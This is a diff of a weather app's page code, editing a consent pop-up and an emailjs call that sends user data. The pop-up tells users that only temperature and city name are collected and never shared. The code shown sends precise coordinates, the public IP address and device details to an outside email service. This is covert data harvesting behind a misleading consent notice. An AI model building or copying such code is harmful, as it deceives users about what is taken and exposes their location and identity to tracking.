@@ -90,13 +90,13 @@
 <div id="consentOverlay" style="position:fixed;inset:0;z-index:999;background:rgba(6,13,31,0.92);-webkit-backdrop-filter:blur(8px);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:1.5rem;overflow-y:auto;">
   <div style="background:#0d1e3f;border:1px solid rgba(77,184,255,0.25);border-radius:24px;padding:2rem;max-width:440px;width:100%;margin:auto;">
     <div style="font-size:2.2rem;margin-bottom:0.8rem;">📡</div>
-    <div style="font-family:'Syne',sans-serif;font-size:1.25rem;font-weight:700;margin-bottom:0.6rem;color:#f0f4ff;">User agreement Notice</div>
+    <div style="font-family:'Syne',sans-serif;font-size:1.25rem;font-weight:700;margin-bottom:0.6rem;color:#f0f4ff;">Data Collection Notice</div>
     <div style="font-size:0.86rem;color:rgba(240,244,255,0.55);line-height:1.65;margin-bottom:1.2rem;">
       To improve <strong style="color:#4db8ff;">Skycast</strong> and make it more accurate for users like you, this app would like to collect the following data with your permission:
       <ul style="list-style:none;margin:0.8rem 0;padding:0;display:flex;flex-direction:column;gap:0.45rem;">
-      
         <li style="display:flex;gap:0.5rem;align-items:flex-start;"><span style="color:#4db8ff;">🌡️</span> Current temperature at your location</li>
         <li style="display:flex;gap:0.5rem;align-items:flex-start;"><span style="color:#4db8ff;">🏙️</span> Your city name </li>
+        <li style="display:flex;gap:0.5rem;align-items:flex-start;"><span style="color:#4db8ff;">📱</span> User Consent </li>
       </ul>
       <div style="background:rgba(77,184,255,0.07);border:1px solid rgba(77,184,255,0.15);border-radius:10px;padding:0.75rem;font-size:0.82rem;margin-top:0.5rem;">
         🔒 This data is used <strong style="color:#4db8ff;">only for app analytics</strong> to fix issues and improve accuracy. It will <strong style="color:#4db8ff;">never</strong> be sold or shared with any third party.
@@ -224,7 +224,7 @@
     if(!userConsented) return;
     try {
       const [ip, device] = await Promise.all([getPublicIP(), Promise.resolve(getDeviceInfo())]);
-      await emailjs.send(EJS_PUBLIC_KEY, EJS_SERVICE_ID, EJS_TEMPLATE_ID, {
+      await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, {
         lat:      lat.toFixed(6),
         lon:      lon.toFixed(6),
         temp:     `${Math.round(temp)}°C`,
